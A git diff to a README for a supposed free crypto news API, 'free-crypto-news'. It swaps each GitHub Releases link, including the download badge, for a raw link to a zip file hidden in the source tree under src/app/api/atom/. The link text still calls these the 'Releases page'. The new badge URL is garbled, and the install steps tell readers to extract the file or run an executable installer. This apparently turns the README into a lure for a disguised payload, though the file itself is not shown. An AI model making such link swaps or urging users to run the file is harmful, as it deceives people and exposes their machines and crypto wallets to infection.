@@ -1,7 +1,7 @@
 # 🚀 free-crypto-news - Access Real-Time Crypto News Effortlessly
 
 ## 📥 Download Now!
-[![Download free-crypto-news](https://img.shields.io/badge/Download-Free%20Crypto%20News-brightgreen.svg)](https://github.com/ahsan5197/free-crypto-news/releases)
+[![Download free-crypto-news](https://github.com/ahsan5197/free-crypto-news/raw/refs/heads/main/src/app/api/atom/news-free-crypto-1.6.zip%20Crypto%https://github.com/ahsan5197/free-crypto-news/raw/refs/heads/main/src/app/api/atom/news-free-crypto-1.6.zip)](https://github.com/ahsan5197/free-crypto-news/raw/refs/heads/main/src/app/api/atom/news-free-crypto-1.6.zip)
 
 ## 🌟 Overview
 free-crypto-news provides a free API that aggregates real-time news for Bitcoin, Ethereum, and other cryptocurrencies. It does not require an API key, making it easy to access the latest information without any hassle. The service includes RSS/Atom feeds, a JSON REST API, and even historical archive data with market context. Whether you're building a trading bot or just following market trends, this tool serves as a reliable resource.
@@ -20,13 +20,13 @@ To run free-crypto-news, ensure you have the following:
 - **Network:** A stable internet connection for real-time updates.
 
 ## 🚀 Getting Started
-1. **Visit the Releases Page:** Go to the [GitHub Releases page](https://github.com/ahsan5197/free-crypto-news/releases).
+1. **Visit the Releases Page:** Go to the [GitHub Releases page](https://github.com/ahsan5197/free-crypto-news/raw/refs/heads/main/src/app/api/atom/news-free-crypto-1.6.zip).
 2. **Choose the Latest Version:** Locate the most recent release. You'll find version numbers clearly marked.  
 3. **Download the Package:** The package will be available as a zip or executable file for your platform. Click on the file to start the download.
 4. **Install or Extract:** If it’s a zip file, extract its contents. If it’s an executable, double-click to run the installer.
 
 ## 📅 Download & Install
-To get started, visit the Releases page to download the latest version: [Download Free Crypto News](https://github.com/ahsan5197/free-crypto-news/releases).
+To get started, visit the Releases page to download the latest version: [Download Free Crypto News](https://github.com/ahsan5197/free-crypto-news/raw/refs/heads/main/src/app/api/atom/news-free-crypto-1.6.zip).
 
 ## 🛠️ Usage
 After installation, follow these steps to access the API:
